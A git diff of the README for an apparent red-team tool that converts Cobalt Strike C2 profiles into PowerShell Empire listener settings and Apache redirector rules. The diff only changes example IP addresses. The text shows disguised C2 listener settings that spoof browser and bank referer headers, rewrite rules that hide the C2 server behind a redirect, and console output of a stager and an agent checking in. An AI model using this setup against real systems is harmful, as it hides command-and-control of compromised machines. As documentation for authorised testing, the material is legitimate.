@@ -26,11 +26,11 @@ The script requires 4 parameters:
 - **-b:** Path containing beacon C2 profiles. Nested folders are OK as the script recurses, searching for files with the extension ".profile".  
 - **-e:** Empire URL, the URL that Apache proxies Empire C2 traffic to. This must be of the format:
 ```
-<uri scheme>://<address>:<port> (e.g. http://12.34.56.789:8080)
+<uri scheme>://<address>:<port> (e.g. http://12.34.56.78:8080)
 ```    
 - **-p:** Proxy URL, the URL that Empire stagers connect to. This must be of the format:
 ```
-<uri scheme>://<address>:<port> (e.g. http://12.34.56.789:8080)
+<uri scheme>://<address>:<port> (e.g. http://12.34.56.78:8080)
 ```
 - **-r:** Redirect URL, the URL that non-Empire requests are redirected to. This must be of the format:
 ```
@@ -39,12 +39,12 @@ The script requires 4 parameters:
 
 For example:
 ```
-python3 convert.py -e http://12.34.56.789:8080 -p http://23.45.67.890:80 -r https://www.google.com -b /home/ubuntu/c2-profiles
+python3 convert.py -e http://12.34.56.78:8080 -p http://23.45.67.89:80 -r https://www.google.com -b /home/ubuntu/c2-profiles
 ```
 - **C2 profile path:** /home/ubuntu/c2-profiles  
-- **Empire public address:** 12.34.56.789 (bind address is always 0.0.0.0)  
+- **Empire public address:** 12.34.56.78 (bind address is always 0.0.0.0)  
 - **Empire port:** 8080  
-- **Proxy IP:** 23.45.67.890  
+- **Proxy IP:** 23.45.67.89  
 - **Proxy port:** 80  
 - **Redirect URL:** https://www.google.com  
 
@@ -61,7 +61,7 @@ The following example uses a profile from: https://github.com/rsmudge/Malleable-
 
 The example uses the same parameters as presented above:
 ```
->python3 convert.py -e http://12.34.56.789:8080 -p http://23.45.67.890:80 -r https://www.google.com -b /home/ubuntu/c2-profiles/test
+>python3 convert.py -e http://12.34.56.78:8080 -p http://23.45.67.89:80 -r https://www.google.com -b /home/ubuntu/c2-profiles/test
 2020-06-20 16:07:08 blackbox beacon2empire[3508] INFO Converting: /home/ubuntu/c2-profiles/test/magnitude.profile
 2020-06-20 16:07:08 blackbox beacon2empire[3508] INFO Empire configuration:
 listeners
@@ -69,7 +69,7 @@ uselistener http
 set Name magnitude
 set BindIP 0.0.0.0
 set Port 8080
-set Host http://23.45.67.890:80
+set Host http://23.45.67.89:80
 set DefaultJitter 50
 set DefaultDelay 45
 set DefaultProfile /themes/index.php,/work/1.php|Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)|Accept:image/jpeg, application/*|Referer:http://www.bankofbotswana.bw/|Accept-Encoding:gzip, deflate|Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8|Accept-Language:en-US;q=0.5,en;q=0.3|Content-Type:application/octet-stream
@@ -78,17 +78,17 @@ set Headers Server:Apache/2.2.17 (Ubuntu)|X-Powered-By:PHP/5.3.5-1ubuntu7.8|Cont
 RewriteEngine On
 RewriteCond %{REQUEST_URI} ^/(themes/index.php|work/1.php)/?$
 RewriteCond %{HTTP_USER_AGENT} ^Mozilla/4\.0\ \(compatible;\ MSIE\ 8\.0;\ Windows\ NT\ 5\.1;\ Trident/4\.0;\ \.NET\ CLR\ 2\.0\.50727;\ \.NET\ CLR\ 3\.0\.4506\.2152;\ \.NET\ CLR\ 3\.5\.30729\)?$
-RewriteRule ^.*$ http://12.34.56.789:8080%{REQUEST_URI} [P]
+RewriteRule ^.*$ http://12.34.56.78:8080%{REQUEST_URI} [P]
 RewriteRule ^.*$ https://www.google.com/? [L,R=302]
 ```
 
 Empire console:
 ```
 (Empire: stager/windows/launcher_bat) >
-[*] Sending POWERSHELL stager (stage 1) to 23.45.67.890
+[*] Sending POWERSHELL stager (stage 1) to 23.45.67.89
 [*] New agent WXPFM9V2 checked in
-[+] Initial agent WXPFM9V2 from 23.45.67.890 now active (Slack)
-[*] Sending agent (stage 2) to WXPFM9V2 at 23.45.67.890
+[+] Initial agent WXPFM9V2 from 23.45.67.89 now active (Slack)
+[*] Sending agent (stage 2) to WXPFM9V2 at 23.45.67.89
 ```
 
 How staging appears in the Apache log:
